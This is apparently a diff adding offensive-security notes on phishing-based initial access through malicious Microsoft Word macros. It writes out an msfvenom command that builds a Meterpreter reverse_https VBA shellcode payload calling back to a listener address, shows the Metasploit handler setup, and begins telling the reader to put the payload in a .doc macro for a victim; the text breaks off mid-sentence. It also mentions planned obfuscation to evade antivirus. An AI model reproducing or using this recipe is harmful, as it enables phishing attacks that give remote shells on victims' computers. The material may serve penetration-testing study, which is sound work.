@@ -1,0 +1,34 @@
+# Initial Access via Phishing
+
+This is for Microsoft Office Word. We assume we are using meterpreter to catch the shell and we will be generating payloads according to the Windows Office version present on the victim. Generally x86 for Office 2016 and x64 for Office 2021/365
+
+We start with the simplest payload which is to create a direct VBA shellcode runner with no obfuscation and then escalate accordingly with obfuscation, powershell and C# usage.
+
+# The Simple Direct VBA Shellcode Runner
+
+**Traits**
+- As simple as it gets. All VBA with help from Win32APIs
+- Unlikely to evade AV
+- Dies the moment the victim closes Word. So you need to migrate to another process quick or you have some pretexting magic to keep the victim on the Word document
+
+
+The malicious payload generated as such:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.231 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+
+Open Listener
+```bash
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
+payload => windows/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set LHOST tun0
+LHOST => tun0
+msf6 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf6 exploit(multi/handler) > set EXITFUNC thread
+EXITFUNC => thread
+
+```
+
+Slot the below into a macro in a .doc file, and get the victim 
